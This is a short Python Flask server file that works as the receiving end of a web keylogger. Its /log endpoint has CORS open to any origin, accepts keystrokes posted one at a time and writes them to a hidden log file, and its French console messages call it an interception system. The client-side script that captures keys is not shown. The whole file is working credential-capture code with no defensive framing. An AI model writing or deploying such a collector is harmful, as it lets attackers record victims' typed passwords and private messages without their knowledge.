from flask import Flask, request
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

LOG_FILE = ".hidden_log.txt" 

@app.route('/log', methods=['POST'])
def log():
    key = request.form.get('key')

    print(f"[INTERCEPTÉ] : {key}")

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        if key == "Enter":
            f.write("\n")
        elif key == "Backspace":
            f.write("[DEL]")
        elif len(key) == 1:
            f.write(key)

    return "", 204

if __name__ == "__main__":
    print("="*50)
    print("SYSTÈME D'INTERCEPTION ET STOCKAGE ACTIF")
    print(f"Les données sont sauvegardées dans : {os.path.abspath(LOG_FILE)}")
    print("="*50)
    app.run(port=5000)